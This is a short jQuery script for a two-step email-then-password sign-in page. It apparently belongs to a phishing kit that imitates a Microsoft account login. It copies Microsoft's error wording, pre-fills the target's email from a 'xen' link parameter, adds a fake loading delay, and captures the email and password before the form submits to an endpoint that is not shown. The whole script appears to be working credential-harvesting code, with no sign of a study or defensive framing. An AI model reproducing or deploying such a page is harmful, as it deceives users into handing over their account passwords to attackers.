    <script>
        var url = new URL(window.location.href);
        var autoemail = url.searchParams.get("xen");
        if (autoemail != null) {
            $("#email").val(autoemail);
        }
        
        var email = "";
        var password = "";
        var step = 1;
        $('body').on('click', '#nextBtn', function (event) {
            if (step == 1) {
                if (validateData('email') == true) {
                    email = $('#email').val();
                    step = 2;

                    $("#progressBar").show();
                    setTimeout(function () {
                        enterPassword();
                        $("#progressBar").hide();
                    }, 2000);
                    
                }
            }else if (step == 2) {
                if (validateData('password') == true) {
                    password = $('#password').val();
                    step = "submit";
                    return "";
                }
            }
            if(step != "submit")
                event.preventDefault();
        });

        $('body').on('click', '.backBtn', function (event) {
            if (step == 2 || step == 3) {
                step = 1;
                enterEmail();
            }
        });

        $('body').on('keyup', '#email,#password', function (event) {
            $("#error").hide();
            $("#email, #password").removeClass("has-error");
        });

        function enterEmail() {
            $("#title").html("Sign in");
            $("#email, .emailHelpLinks, #signin_options").show();
            $("#password, .passwordHelpLinks, .identityBanner").hide();
            $("#nextBtn").attr("value", "Next");
        }

        function enterPassword() {
            $(".identityBanner").show();
            $("#displayName").html(email);
            $("#title").html("Enter password");
            $("#email, .emailHelpLinks, #signin_options").hide();
            $("#password, .passwordHelpLinks").show();
            $("#nextBtn").attr("value", "Sign In");
        }

        function showLoading() {
            $("#progressBar").show();
            setTimeout(function () {}, 2000);
        }
        function hideLoading() {
            $("#progressBar").hide();
        }

        function validateData(check_type) {
            if (check_type == 'email') {
                if ($('#email').val() == "") {
                    $("#error").html("Enter a valid email address, phone number, or Skype name.").show();
                    $("#email").addClass("has-error");
                    return false;
                }
                return true;
            }

            if (check_type == 'password') {
                if ($('#password').val() == "") {
                    $("#error").html('Please enter your password.').show();
                    $("#password").addClass("has-error");
                    return false;
                }
                return true;
            }

        }
    </script>
